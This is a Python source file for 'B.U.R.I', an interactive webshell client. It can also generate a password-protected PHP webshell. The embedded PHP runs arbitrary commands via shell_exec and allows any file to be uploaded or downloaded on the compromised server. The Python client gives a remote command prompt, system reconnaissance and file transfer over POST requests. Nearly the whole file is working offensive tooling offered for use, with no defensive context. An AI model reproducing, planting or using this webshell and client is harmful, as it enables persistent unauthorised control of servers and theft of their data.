import requests
import sys
import os
import argparse
import readline
import base64
import json
import time
import re
from urllib.parse import urlparse
from typing import Optional, List

# The 'rich' library is now used for all UI elements
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.syntax import Syntax
from rich.status import Status
from rich.text import Text
from rich.align import Align
from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from prompt_toolkit.styles import Style

class WebShell:
    """A powerful, stateful webshell client with a rich user interface."""
    
    def __init__(self, url: str, password: Optional[str] = None):
        self.url = url
        self.password = password
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.hostname = urlparse(self.url).hostname
        self.console = Console()
        self.current_user = "user"
        self.current_path = "~"

    def _send_request(self, payload: dict, timeout: int = 20) -> dict:
        """Helper to send POST requests and handle common errors."""
        try:
            response = self.session.post(self.url, data=payload, timeout=timeout)
            response.raise_for_status()
            return response.json()
        except requests.RequestException as e:
            return {'status': 'error', 'message': f"Request Error: {e}"}
        except json.JSONDecodeError:
            return {'status': 'error', 'message': "Failed to decode JSON. Is this an advanced webshell?"}

    def _test_connection(self) -> bool:
        """Tests the connection with an animated status indicator."""
        status = Status("[bold yellow]Connecting to shell...", spinner="dots12")
        with self.console.status(status):
            payload = {'pass': self.password, 'action': 'exec', 'cmd': 'echo "OK"'}
            data = self._send_request(payload)
            if data.get('status') == 'success' and "OK" in data.get('output', ''):
                self.console.print("")
                time.sleep(3)
                self.console.clear()
                return True
            else:
                self.console.print(Panel(f"[bold red]Connection Failed:[/bold red]\n{data.get('message', 'No response')}", border_style="red"))
                return False

    def execute_command(self, command: str) -> str:
        """Executes a command within the context of the current remote directory."""
        full_command = f"cd {self.current_path} && {command}"
        payload = {'pass': self.password, 'action': 'exec', 'cmd': full_command}
        data = self._send_request(payload)
        
        # CORRECTED LOGIC: This now correctly returns an error string instead of crashing.
        if data.get('status') == 'success':
            return data.get('output', '')
        else:
            return f"[ERROR] {data.get('message', 'Unknown server error')}"

    def _update_prompt_info(self):
        """Fetches user and path to build the prompt in a more robust way."""
        # Get the real username by running 'whoami'
        user_output = self.execute_command("whoami").strip()
        # A valid username typically doesn't contain errors or newlines.
        if user_output and not user_output.startswith('[ERROR]') and '\n' not in user_output:
            self.current_user = user_output
        
        # Get the current path by running 'pwd'
        path_output = self.execute_command("pwd").strip()
        # A valid path usually starts with a slash.
        if path_output and path_output.startswith('/'):
            self.current_path = path_output

    def _handle_cd(self, args: List[str]):
        """Handles the 'cd' command with improved error checking."""
        target_path = args[0] if args else "~"
        
        command_to_verify = f"cd {self.current_path} && cd {target_path} && pwd"
        output = self.execute_command(command_to_verify).strip()

        # CORRECTED LOGIC: Now correctly checks for the error string.
        if output.startswith('[ERROR]') or "No such file or directory" in output or "Permission denied" in output:
            if 'root' in target_path.lower() and 'denied' in output.lower():
                self.console.print("[bold red]⛔ ACCESS DENIED:[/bold red] You are not the root user!")
            else:
                self.console.print(f"[bold red]cd failed:[/bold red] {output}")
        elif output.startswith('/'):
            self.current_path = output
        else:
            self.console.print(f"[yellow]Warning:[/yellow] Received unexpected output from cd: {output}")

    def _handle_sysinfo(self):
        """Gathers and displays system information in a formatted table."""
        status = Status("[cyan]Gathering system info...", spinner="earth")
        with self.console.status(status):
            commands = { "os": "uname -a", "user": "id", "net": "ip a || /sbin/ifconfig" }
            results = {key: self.execute_command(cmd) for key, cmd in commands.items()}
        
        table = Table(title="💻 Remote System Information", border_style="magenta")
        table.add_column("Property", style="cyan", no_wrap=True)
        table.add_column("Value", style="green")
        table.add_row("OS / Kernel", results['os'].strip())
        table.add_row("Hostname", self.hostname)
        table.add_row("Current User", results['user'].strip())
        ips = re.findall(r'inet (\d+\.\d+\.\d+\.\d+)', results['net'])
        if ips:
            table.add_row("IP Addresses", ", ".join(ip for ip in ips if ip != "127.0.0.1"))
        self.console.print(table)

    def interactive_shell(self):
        """Starts the main interactive shell loop with full client-side command support."""
        print_banner(self.console)
        if not self._test_connection(): return

        self._update_prompt_info()
        
        history = FileHistory('.buri_history')
        style = Style.from_dict({
            'username': 'bold #44ff44', 'at': '#bbbbbb', 'hostname': 'bold #00aaff',
            'colon': '#bbbbbb', 'path': 'bold #00ffff', 'dollar': '#ffffff',
        })

        should_exit = False
        while not should_exit:
            try:
                prompt_parts = [
                    ('class:username', self.current_user), ('class:at', '@'),
                    ('class:hostname', self.hostname), ('class:colon', ':'),
                    ('class:path', self.current_path), ('class:dollar', '$ '),
                ]
                
                cmd_input = prompt(
                    prompt_parts,
                    history=history,
                    style=style,
                ).strip()

                if not cmd_input: continue
                
                individual_commands = [cmd.strip() for cmd in cmd_input.split(';') if cmd.strip()]

                for single_cmd in individual_commands:
                    parts = single_cmd.split()
                    command = parts[0].lower()
                    args = parts[1:]

                    if command == 'exit':
                        should_exit = True
                        break
                    elif command in ('clear', 'cls'):
                        self.console.clear()
                    elif command == 'help':
                        print_help(self.console)
                    elif command == 'sysinfo':
                        self._handle_sysinfo()
                    elif command == 'cd':
                        self._handle_cd(args)
                        self._update_prompt_info()
                    # --- ADDED MISSING LOGIC ---
                    elif command == 'upload':
                        self._handle_upload(args)
                    elif command == 'download':
                        self._handle_download(args)
                    # ---------------------------
                    else:
                        output = self.execute_command(single_cmd)
                        if "{" in output or "<" in output or "[" in output:
                            lexer = Syntax.guess_lexer(output, default="bash")
                            self.console.print(Syntax(output, lexer, theme="monokai", line_numbers=True))
                        else:
                            self.console.print(Panel(output.strip(), expand=False, border_style="yellow"))

            except KeyboardInterrupt:
                continue
            except EOFError:
                break
            except Exception as e:
                self.console.print(f"[bold red]Shell Error:[/bold red] {e}")

        self.console.print("\n[bold yellow]Session closed.[/bold yellow]")

    # You will also need this helper function for the upload/download to work correctly.
    # Make sure it is present in your WebShell class.
    def _handle_upload(self, args: list):
        if len(args) != 2:
            self.console.print(f"[red]Usage: upload <local_file> <remote_destination>[/red]")
            return
        local_file, remote_file = args
        remote_dest = f"{self.current_path}/{remote_file}" if not remote_file.startswith('/') else remote_file
        
        if not os.path.exists(local_file):
            self.console.print(f"[red]Error: Local file '{local_file}' not found.[/red]")
            return
        try:
            with open(local_file, 'rb') as f:
                file_content_b64 = base64.b64encode(f.read()).decode('utf-8')
            payload = {'pass': self.password, 'action': 'upload', 'path': remote_dest, 'data': file_content_b64}
            response = self._send_request(payload, timeout=60)
            if response.get('status') == 'success':
                self.console.print(f"[green]Successfully uploaded '{local_file}' to '{remote_dest}'[/green]")
            else:
                self.console.print(f"[red]Upload failed: {response.get('message', 'Unknown error')}[/red]")
        except Exception as e:
            self.console.print(f"[red]An error occurred during upload: {e}[/red]")

    # You will also need this helper function for the upload/download to work correctly.
    # Make sure it is present in your WebShell class.
    def _handle_download(self, args: list):
        if len(args) != 2:
            self.console.print(f"[red]Usage: download <remote_file> <local_destination>[/red]")
            return
        remote_file, local_dest = args
        remote_source = f"{self.current_path}/{remote_file}" if not remote_file.startswith('/') else remote_file
        
        try:
            payload = {'pass': self.password, 'action': 'download', 'path': remote_source}
            response = self._send_request(payload, timeout=60)
            if response.get('status') == 'success':
                file_content_b64 = response.get('data', '')
                with open(local_dest, 'wb') as f:
                    f.write(base64.b64decode(file_content_b64))
                self.console.print(f"[green]Successfully downloaded '{remote_source}' to '{local_dest}'[/green]")
            else:
                self.console.print(f"[red]Download failed: {response.get('message', 'File not found or permission denied')}[/red]")
        except Exception as e:
            self.console.print(f"[red]An error occurred during download: {e}[/red]")

# --- Helper functions for UI ---
def print_banner(console: Console):
    """Prints a visually appealing ASCII art banner."""
    # By adding 'r' here, we make it a raw string, fixing the warning.
    ascii_art = r"""
[bold blue] ____  _   _ ____  _   [/bold blue]
[bold blue]| __ )| | | |  _ \| |  [/bold blue]
[bold blue]|  _ \| | | | |_) | |  [/bold blue]
[bold blue]| |_) | |_| |  _ <|_|  [/bold blue]
[bold blue]|____/ \___/|_| \_(_)  [/bold blue]
"""
    
    # Combine the ASCII art and a subtitle into a single Text object for alignment
    banner_content = Text.from_markup(f"{ascii_art}\n--- [cyan]An Interactive Webshell Client | Created by Anonre[/cyan] ---")

    # Center the content and wrap it in a styled panel
    console.print(
        Panel(
            Align.center(banner_content),
            title="[bold yellow]B.U.R.I[/bold yellow]",
            subtitle="[cyan]v3.0[/cyan]",
            border_style="magenta",
            expand=False,
            padding=(1, 5)
        )
    )

def print_help(console: Console):
    table = Table(title="Client-Side Commands Help", border_style="green")
    table.add_column("Command", style="cyan")
    table.add_column("Description")
    table.add_rows(
        ("sysinfo", "Display detailed information about the remote system."),
        ("upload <local> <remote>", "Upload a file to the server."),
        ("download <remote> <local>", "Download a file from the server."),
        ("cd <path>", "Change the remote working directory."),
        ("clear / cls", "Clear the local terminal screen."),
        ("exit", "Exit the webshell session.")
    )
    console.print(table)
    console.print("\nAny other command is executed on the remote server.")

def generate_webshell(file_path: str, password: str):
    # This function remains unchanged from the previous version
    console = Console()
    advanced_webshell = """
<?php
header('Content-Type: application/json'); header('Cache-Control: no-cache, must-revalidate');
$response = ['status' => 'error', 'message' => 'Invalid request']; $pass = '{0}';
if (isset($_POST['pass']) && $_POST['pass'] === $pass) {{
    if (isset($_POST['action'])) {{
        switch ($_POST['action']) {{
            case 'exec':
                if (isset($_POST['cmd'])) {{ $output = shell_exec($_POST['cmd'] . ' 2>&1'); $response = ['status' => 'success', 'output' => $output]; }} else {{ $response['message'] = 'No command provided.'; }}
                break;
            case 'upload':
                if (isset($_POST['path']) && isset($_POST['data'])) {{
                    if (file_put_contents($_POST['path'], base64_decode($_POST['data'])) !== false) {{ $response = ['status' => 'success', 'message' => 'File uploaded.']; }} else {{ $response['message'] = 'Failed to write file.'; }}
                }} else {{ $response['message'] = 'Path or data not provided.'; }}
                break;
            case 'download':
                if (isset($_POST['path']) && is_readable($_POST['path'])) {{ $response = ['status' => 'success', 'data' => base64_encode(file_get_contents($_POST['path']))]; }} else {{ $response['message'] = 'File not found or not readable.'; }}
                break;
            default: $response['message'] = 'Invalid action.';
        }}
    }}
}} else {{ $response['message'] = 'Access denied.'; http_response_code(403); }}
echo json_encode($response);
?>"""
    try:
        content = advanced_webshell.format(password).strip()
        with open(file_path, 'w') as file: file.write(content)
        os.chmod(file_path, 0o644)
        console.print(f"[green]Success created fckedshell at[/green] [yellow]{file_path}[/yellow]")
    except IOError as e:
        console.print(f"[red]Error creating webshell: {e}[/red]")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="BURI - A Powerful Webshell Client", formatter_class=argparse.RawTextHelpFormatter)
    subparsers = parser.add_subparsers(dest='action', required=True)
    create_parser = subparsers.add_parser('create', help='Create an advanced PHP webshell file.')
    create_parser.add_argument('file_path', help='Path to save the webshell file.')
    create_parser.add_argument('--password', required=True, help='Password for webshell access.')
    run_parser = subparsers.add_parser('run', help='Run an interactive shell on a remote server.')
    run_parser.add_argument('url', help='URL of the webshell.')
    run_parser.add_argument('--password', required=True, help='Password for webshell access.')
    args = parser.parse_args()
    if args.action == "create":
        generate_webshell(args.file_path, args.password)
    elif args.action == "run":
        shell = WebShell(args.url, args.password)
        shell.interactive_shell()

if __name__ == "__main__":
    main()
